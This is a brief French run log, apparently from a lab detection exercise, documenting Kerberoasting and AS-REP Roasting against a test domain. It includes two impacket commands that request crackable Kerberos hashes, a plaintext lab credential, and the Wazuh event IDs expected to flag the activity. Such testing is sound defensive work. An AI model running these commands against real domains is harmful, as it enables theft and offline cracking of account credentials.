# Run log — T1558.003/T1558.004 Kerberoasting & AS-REP Roasting

## Comptes ciblés
- svc-sql (SPN MSSQLSvc/dc01.lab.local:1433) — Kerberoasting
- backup-svc — AS-REP Roasting (DoesNotRequirePreAuth)

## Commandes
impacket-GetUserSPNs lab.local/jsmith:'WeakPass789X' -dc-ip 192.168.50.10 -request
impacket-GetNPUsers lab.local/ -usersfile users.txt -dc-ip 192.168.50.10 -no-pass -format hashcat

## Détection Wazuh
Event ID 4769 (TGS, RC4 0x17) et 4768 (TGT, no PreAuthType) attendus sur DCO1.
Statut: [à compléter après vérification Threat Hunting]

## Remarque sécurité
Les hashes bruts (asrep.hash, *.json BloodHound) ne sont PAS versionnés (voir .gitignore).
